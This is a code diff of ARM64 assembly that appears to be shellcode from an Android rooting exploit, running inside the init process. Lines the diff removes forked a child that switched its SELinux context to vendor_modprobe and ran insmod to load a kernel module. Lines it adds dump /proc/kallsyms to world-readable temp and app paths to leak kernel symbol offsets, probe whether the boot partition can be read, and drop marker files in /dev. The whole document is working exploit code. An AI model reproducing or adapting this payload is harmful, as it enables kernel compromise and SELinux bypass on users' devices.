@@ -15,12 +15,24 @@ mutex_file:
     .asciz "/dev/df"
 kallsyms_path:
     .asciz "/proc/kallsyms"
-ks_out_path:
+boot_path:
+    .asciz "/dev/block/by-name/boot"
+out_tmp:
     .asciz "/data/local/tmp/ks.txt"
-ks_ok:
+out_app:
+    .asciz "/data/user_de/0/df.root/ks.txt"
+m_k0:
+    .asciz "/dev/k0"
+m_kx:
+    .asciz "/dev/kx"
+m_kr:
+    .asciz "/dev/kr"
+m_kw:
+    .asciz "/dev/kw"
+m_kb:
+    .asciz "/dev/kb"
+m_ok:
     .asciz "/dev/ksok"
-ks_fail:
-    .asciz "/dev/ksfail"
 selinux_ctx:
     .asciz "u:r:vendor_modprobe:s0"
 selinux_ctx_end:
@@ -72,124 +84,91 @@ libcxx_start:
     // return if fail to open (file exist)
     tbnz    w0, #31, return
 
-    // ── dump /proc/kallsyms so the host can derive symbol offsets ─────
-    stp     x19, x20, [sp, #-16]!
-    sub     sp, sp, #4096
-
+    // ── probe + dump /proc/kallsyms (multi-path, tagged failures) ─────
+    // open kallsyms
     mov     x0, -100
     adr     x1, kallsyms_path
     mov     x2, xzr
     mov     x8, #SYS_openat
     svc     0
     mov     x19, x0
-    tbnz    w19, #31, 1f
+    tbnz    w19, #31, 6f
 
+    // out1: /data/local/tmp/ks.txt
     mov     x0, -100
-    adr     x1, ks_out_path
+    adr     x1, out_tmp
     movl    x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
-    mov     x3, #0644
+    mov     x3, #0640
     mov     x8, #SYS_openat
     svc     0
     mov     x20, x0
-    tbnz    w20, #31, 2f
+    tbz     w20, #31, 1f
 
-3:
+    // out2: /data/user_de/0/df.root/ks.txt
+    mov     x0, -100
+    adr     x1, out_app
+    movl    x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
+    mov     x3, #0640
+    mov     x8, #SYS_openat
+    svc     0
+    mov     x20, x0
+    tbnz    w20, #31, 7f
+1:
+    sub     sp, sp, #4096
+2:
     mov     x0, x19
     mov     x1, sp
     mov     x2, #4096
     mov     x8, #SYS_read
     svc     0
-    cmp     x0, #0
-    b.le    4f
+    tbnz    x0, #63, 8f
+    cbz     x0, 3f
     mov     x2, x0
     mov     x0, x20
     mov     x1, sp
     mov     x8, #SYS_write
     svc     0
-    b       3b
-
-4:
+    tbnz    x0, #63, 9f
+    b       2b
+3:
+    add     sp, sp, #4096
     mov     x0, x20
     mov     x8, #SYS_close
     svc     0
     mov     x0, x19
     mov     x8, #SYS_close
     svc     0
-    create_mark ks_ok
-    b       5f
-2:
-    mov     x0, x19
-    mov     x8, #SYS_close
-    svc     0
-1:
-    create_mark ks_fail
-5:
-    add     sp, sp, #4096
-    ldp     x19, x20, [sp], #16
-
-    sub     sp, sp, 16
-
-    // syscall(SYS_gettid);
-    mov     x8, SYS_gettid
-    svc     0
-    str     w0, [sp, 8]
-
-    // clone(CLONE_CHILD_SETTID   |
-    //       CLONE_CHILD_CLEARTID |
-    //       SIGCHLD, 0, NULL, NULL, &ctid)
-    mov     x8, SYS_clone
-    add     x4, sp, 8           // ctid
-    mov     x3, xzr              // newtls
-    mov     x2, xzr              // ptid
-    mov     x1, xzr              // stack
-    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
-    svc     0
-    str     w0, [sp, 8]         // save id
-    add     sp, sp, 16
-
-    cbnz    w0, return          // parent returns to init
-
-    // ── worker child ──────────────────────────────────────────────────────
-    sub     sp, sp, 32
-
-    // Fork grandchild: set SELinux exec context → execve insmod
-    mov     x0, #SIGCHLD
-    mov     x1, xzr
-    mov     x2, xzr
-    mov     x3, xzr
-    mov     x4, xzr
-    mov     x8, #SYS_clone
-    svc     0
-    cbnz    w0, myexit
-
-    // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
-    // open /proc/self/attr/exec
+    create_mark m_ok
+    b       return
+6:
+    // kallsyms denied: is the boot partition readable instead?
     mov     x0, -100
-    adr     x1, attr_exec
-    movl    x2, (O_WRONLY|O_CLOEXEC)
+    adr     x1, boot_path
+    mov     x2, xzr
     mov     x8, #SYS_openat
     svc     0
-    adr     x1, selinux_ctx
-    mov     x2, selinux_ctx_end - selinux_ctx
-    mov     x8, #SYS_write
+    tbz     w0, #31, 11f
+    mov     x21, x0
+    create_mark m_kb
+    mov     x0, x21
+    mov     x8, #SYS_close
     svc     0
+    b       return
+11:
+    create_mark m_k0
+    b       return
+7:
+    create_mark m_kx
+    b       return
+8:
+    add     sp, sp, #4096
+    create_mark m_kr
+    b       return
+9:
+    add     sp, sp, #4096
+    create_mark m_kw
+    b       return
 
-    // execve("/vendor/bin/insmod", [exe_path, ko_target, NULL], NULL)
-    adr     x1, exe_path
-    str     x1, [sp]
-    adr     x1, ko_target
-    str     x1, [sp, 8]
-    str     xzr, [sp, 16]
-    adr     x0, exe_path
-    mov     x1, sp
-    mov     x2, xzr
-    mov     x8, #SYS_execve
-    svc     0
-
-myexit:
-    mov     x0, #1
-    mov     x8, #SYS_exit
-    svc     0
 
 return:
     ldr x30, [sp], #16
